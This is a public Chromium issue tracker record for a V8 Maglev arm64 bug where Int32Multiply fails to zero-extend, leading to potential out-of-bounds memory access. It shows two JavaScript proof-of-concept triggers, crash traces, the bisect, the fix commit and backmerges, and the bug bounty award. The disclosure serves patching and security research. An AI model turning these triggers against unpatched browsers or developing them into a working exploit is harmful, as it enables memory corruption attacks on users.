#  v8 incorrect Integer Overflow Elimination leads to potential OOB R/W

| Field | Value |
|-------|-------|
| **Issue ID** | [466786677](https://issues.chromium.org/issues/466786677) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript, Blink>JavaScript>Compiler>Maglev |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | fa...@gmail.com |
| **Assignee** | vi...@chromium.org |
| **Created** | 2025-12-08 |
| **Bounty** | $7,000.00 |

## Description

```
Received signal 11 SEGV_ACCERR 719801064773

==== C stack trace ===============================

../v8/v8/out/arm64/d8(__interceptor_backtrace+0x46)[0x5cca99d37a66]
../v8/v8/out/arm64/d8(_ZN2v84base5debug10StackTraceC2Ev+0x13)[0x5ccaa1e105a3]
../v8/v8/out/arm64/d8(+0xc4a03b0)[0x5ccaa1e103b0]
/lib/x86_64-linux-gnu/libc.so.6(+0x45330)[0x76dd7ca45330]
../v8/v8/out/arm64/d8(v8_internal_simulator_ProbeMemory+0x0)[0x5cca9df2d888]
[end of stack trace]
Segmentation fault

```
#### VERSION

V8 version 14.5.0 (candidate)

#### REPRODUCTION CASE

Build: `linux arm64 simulated`

```
is_asan = true
is_debug = true
symbol_level = 2
v8_enable_backtrace = true
target_cpu = "x64"
v8_target_cpu = "arm64"
v8_enable_i18n_support = false
is_component_build = false

```

poc.js:

```
let warmup_count = 300;
for (let i = 0; i < warmup_count; i++) {
  let o = {};
  o[0] = i * 0.1;
  o[1] = i * 0.1;
  o[2] = i * 0.1;
  let x = o[2];
}

function trigger(cond) {
  let o = {};
  let mul = (cond ? 1 : 0x80000000) | 0;
  let idx = (mul * 2) | 0;
  o[0] = 1.1;
  if (cond) o[1] = 2.2;
  return o[idx];
}

for (let i = 0; i < 300; i++) {
  trigger(true);
  trigger(false);
}

trigger(true);
trigger(false);


```

Run: `./d8 poc.js`

---

Reporter credit: Shaheen Fazim

## Timeline

### fa...@gmail.com (2025-12-08)

Bisect result: [4d53d4aa0d96f26bbb620f07f72b97cbf246f4f9](https://chromium-review.googlesource.com/c/v8/v8/+/6939385) is the first bad commit.

### fa...@gmail.com (2025-12-08)

MacOS `arm64.debug`:

```

Received signal 10 BUS_ADRALN 37b001064c14

==== C stack trace ===============================

0   libv8_libbase.dylib                 0x0000000100ab987c _ZN2v84base5debug10StackTraceC2Ev + 32
1   libv8_libbase.dylib                 0x0000000100ab98b8 _ZN2v84base5debug10StackTraceC1Ev + 28
2   libv8_libbase.dylib                 0x0000000100ab97e0 _ZN2v84base5debug12_GLOBAL__N_122StackDumpSignalHandlerEiP9__siginfoPv + 1208
3   libsystem_platform.dylib            0x000000018ce6b744 _sigtramp + 56
4   ???                                 0x000000015b640604 0x0 + 5828249092
5   ???                                 0x0000000162b45574 0x0 + 5950952820
6   ???                                 0x0000000162b3c1e0 0x0 + 5950915040
7   ???                                 0x0000000162b3be14 0x0 + 5950914068
8   libv8.dylib                         0x00000001175f6e2c _ZN2v88internal13GeneratedCodeImJmmmmlPPmEE4CallEmmmmlS3_ + 76
9   libv8.dylib                         0x00000001175f3d40 _ZN2v88internal12_GLOBAL__N_16InvokeEPNS0_7IsolateERKNS1_12InvokeParamsE + 4028
10  libv8.dylib                         0x00000001175f4424 _ZN2v88internal9Execution10CallScriptEPNS0_7IsolateENS0_12DirectHandleINS0_10JSFunctionEEENS4_INS0_6ObjectEEES8_ + 412
11  libv8.dylib                         0x0000000116e865a0 _ZN2v86Script3RunENS_5LocalINS_7ContextEEENS1_INS_4DataEEE + 820
12  libv8.dylib                         0x0000000116e86230 _ZN2v86Script3RunENS_5LocalINS_7ContextEEE + 80
13  d8                                  0x000000010059ca28 _ZN2v85Shell13ExecuteStringEPNS_7IsolateENS_5LocalINS_6StringEEES5_NS0_16ReportExceptionsEPNS_6GlobalINS_5ValueEEE + 2216
14  d8                                  0x00000001005c1bcc _ZN2v811SourceGroup7ExecuteEPNS_7IsolateE + 1044
15  d8                                  0x00000001005c8608 _ZN2v85Shell14RunMainIsolateEPNS_7IsolateEb + 556
16  d8                                  0x00000001005c80b4 _ZN2v85Shell7RunMainEPNS_7IsolateEb + 252
17  d8                                  0x00000001005ca870 _ZN2v85Shell4MainEiPPc + 3380
18  d8                                  0x00000001005cb0ec main + 36
19  dyld                                0x000000018ca99d54 start + 7184
[end of stack trace]


```

### cl...@appspot.gserviceaccount.com (2025-12-08)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4798757916835840.

### nh...@chromium.org (2025-12-08)

Tentatively set FoundIn and severity.

### md...@google.com (2025-12-09)

Assigning based on bisect comment.

### ch...@google.com (2025-12-09)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2025-12-09)

Setting Priority to P1 to match Severity s1. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### vi...@chromium.org (2025-12-09)

Simpler poc:

```
function trigger(cond) {
  let o = {};
  let mul = (cond ? 1 : 0x80000000) | 0;
  let idx = (mul * 2) | 0;
  o[0] = 1.1;
  if (cond) o[1] = 2.2;
  return o[idx];
}

%PrepareFunctionForOptimization(trigger);
trigger(true);
trigger(false);
%OptimizeMaglevOnNextCall(trigger);
trigger(false);

```

### vi...@chromium.org (2025-12-09)

The problem here seems to be that Int32Multiply doesn't zero extend its result.

### dx...@google.com (2025-12-09)

Project: v8/v8  

Branch:  main  

Author:  Victor Gomes [victorgomes@chromium.org](mailto:victorgomes@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7241729>

[maglev][arm64] Ensure we zero-extend in Int32Multiply

---


Expand for full commit details
```
     
    Fixed: 466786677 
    Change-Id: Ie75222393743a8beeb99f9382dc6d345b8f62604 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7241729 
    Auto-Submit: Victor Gomes <victorgomes@chromium.org> 
    Commit-Queue: Darius Mercadier <dmercadier@chromium.org> 
    Reviewed-by: Darius Mercadier <dmercadier@chromium.org> 
    Commit-Queue: Victor Gomes <victorgomes@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#104206}

```

---

Files:

- M `src/maglev/arm64/maglev-ir-arm64.cc`
- A `test/mjsunit/maglev/regress-466786677.js`

---

Hash: [e0052e7af9c98557d2e65431a9c070c7469c7b06](https://chromiumdash.appspot.com/commit/e0052e7af9c98557d2e65431a9c070c7469c7b06)  

Date: Tue Dec 9 14:16:44 2025


---

### ch...@google.com (2025-12-10)

Security Merge Request Consideration: This is sufficiently serious that it should be merged to extended stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M142. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request Consideration: This is sufficiently serious that it should be merged to stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M143. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request Consideration: This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M144. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### vi...@chromium.org (2025-12-10)

1. <https://chromium-review.googlesource.com/c/v8/v8/+/7241729>
2. In canary since yesterday.
3. No
4. No
5. No
6. N/A

### ch...@google.com (2025-12-10)

Merge review required: M144 is already shipping to beta.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: alonbajayo (ChromeOS), srinivassista (Desktop US), danielyip (Desktop EMEA), govind (Mobile US), eakpobaro (Mobile EMEA)

### ch...@google.com (2025-12-10)

Merge review required: M143 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: lmenezes (ChromeOS), srinivassista (Desktop US), danielyip (Desktop EMEA), harrysouders (Mobile US), eakpobaro (Mobile EMEA)

### ch...@google.com (2025-12-10)

Merge review required: M142 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: andywu (ChromeOS), srinivassista (Desktop US), danielyip (Desktop EMEA), govind (Mobile US), eakpobaro (Mobile EMEA)

### vi...@chromium.org (2025-12-10)

1. Security issue, high severity
2. <https://chromium-review.googlesource.com/c/v8/v8/+/7241729>
3. Yes, since yesterday (145.0.7572.0)
4. No.
5. N/A
6. No

### ya...@chromium.org (2025-12-11)

Please proceed with the merge

### dm...@chromium.org (2025-12-12)

Victor is OOO for the next 3 weeks or so; I'll take over for the merges.

### dx...@google.com (2025-12-12)

Project: v8/v8  

Branch:  refs/branch-heads/14.2  

Author:  Victor Gomes [victorgomes@chromium.org](mailto:victorgomes@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7252673>

Merged: [maglev][arm64] Ensure we zero-extend in Int32Multiply

---


Expand for full commit details
```
     
    Bug: 466786677 
    (cherry picked from commit e0052e7af9c98557d2e65431a9c070c7469c7b06) 
     
    Change-Id: Ie8667cbb0b6426eec7ac193efb1f23a1b8f95714 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7252673 
    Reviewed-by: Leszek Swirski <leszeks@chromium.org> 
    Auto-Submit: Darius Mercadier <dmercadier@chromium.org> 
    Reviewed-by: Michael Achenbach <machenbach@chromium.org> 
    Commit-Queue: Michael Achenbach <machenbach@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/14.2@{#43} 
    Cr-Branched-From: 37f82dbb9f640dc5eea09870dd391cd3712546e5-refs/heads/14.2.231@{#1} 
    Cr-Branched-From: d1a6089b861336cf4b3887edfd3fdd280b23b5dd-refs/heads/main@{#102804}

```

---

Files:

- M `src/maglev/arm64/maglev-ir-arm64.cc`
- A `test/mjsunit/maglev/regress-466786677.js`

---

Hash: [0865590a3443271c6e47b44bfeecac33ec08a25d](https://chromiumdash.appspot.com/commit/0865590a3443271c6e47b44bfeecac33ec08a25d)  

Date: Tue Dec 9 14:16:44 2025


---

### dx...@google.com (2025-12-12)

Project: v8/v8  

Branch:  refs/branch-heads/14.3  

Author:  Victor Gomes [victorgomes@chromium.org](mailto:victorgomes@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7252674>

Merged: [maglev][arm64] Ensure we zero-extend in Int32Multiply

---


Expand for full commit details
```
     
    Bug: 466786677 
    (cherry picked from commit e0052e7af9c98557d2e65431a9c070c7469c7b06) 
     
    Change-Id: I21aca92f851d01809668ce1b1e3ba25fd0deafec 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7252674 
    Commit-Queue: Michael Achenbach <machenbach@chromium.org> 
    Auto-Submit: Darius Mercadier <dmercadier@chromium.org> 
    Reviewed-by: Michael Achenbach <machenbach@chromium.org> 
    Reviewed-by: Leszek Swirski <leszeks@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/14.3@{#32} 
    Cr-Branched-From: 13c7e3135187c1b0c7344e42529fbc27ba0e47f1-refs/heads/14.3.127@{#1} 
    Cr-Branched-From: 01af089bd89645143fc60f0da72267f95645afb3-refs/heads/main@{#103352}

```

---

Files:

- M `src/maglev/arm64/maglev-ir-arm64.cc`
- A `test/mjsunit/maglev/regress-466786677.js`

---

Hash: [60dd34eaf56b2514f8fe60426b0277e5008a7af0](https://chromiumdash.appspot.com/commit/60dd34eaf56b2514f8fe60426b0277e5008a7af0)  

Date: Tue Dec 9 14:16:44 2025


---

### pe...@google.com (2025-12-12)

LTS Milestone M138

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### dx...@google.com (2025-12-12)

Project: v8/v8  

Branch:  refs/branch-heads/14.4  

Author:  Victor Gomes [victorgomes@chromium.org](mailto:victorgomes@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7252675>

Merged: [maglev][arm64] Ensure we zero-extend in Int32Multiply

---


Expand for full commit details
```
     
    Bug: 466786677 
    (cherry picked from commit e0052e7af9c98557d2e65431a9c070c7469c7b06) 
     
    Change-Id: I6e8a6cae6aee58343fa0a760555aa00e5c799102 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7252675 
    Commit-Queue: Michael Achenbach <machenbach@chromium.org> 
    Auto-Submit: Darius Mercadier <dmercadier@chromium.org> 
    Reviewed-by: Michael Achenbach <machenbach@chromium.org> 
    Reviewed-by: Leszek Swirski <leszeks@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/14.4@{#18} 
    Cr-Branched-From: 80acc26727d5a34e77dabeebe7c9213ec1bd4768-refs/heads/14.4.258@{#1} 
    Cr-Branched-From: ce7e597e90f6df3fa4b6df224bc613b80c635450-refs/heads/main@{#104020}

```

---

Files:

- M `src/maglev/arm64/maglev-ir-arm64.cc`
- A `test/mjsunit/maglev/regress-466786677.js`

---

Hash: [94abef72ecf5f2a0bde77f55327d0062d1aae827](https://chromiumdash.appspot.com/commit/94abef72ecf5f2a0bde77f55327d0062d1aae827)  

Date: Tue Dec 9 14:16:44 2025


---

### qk...@google.com (2025-12-15)

Labeling this issue as not applicable for LTS M138 because M138 doesn't contain the suspected CL[1], and also it doesn't have `maglev_truncation` definition in `//src/flags/flag-definitions.h`

[1] <https://chromium-review.googlesource.com/c/v8/v8/+/6939385>

### sp...@google.com (2025-12-18)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $7000.00 for this report.

Rationale for this decision:
baseline memory corruption in a sandboxed process


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### fa...@gmail.com (2025-12-18)

Hi, bisect reward is missing. I identified and commented the first bad commit in [comment #2](https://issues.chromium.org/issues/466786677#comment2).

### ch...@google.com (2026-03-18)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> baseline memory corruption in a sandboxed process

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/466786677)*
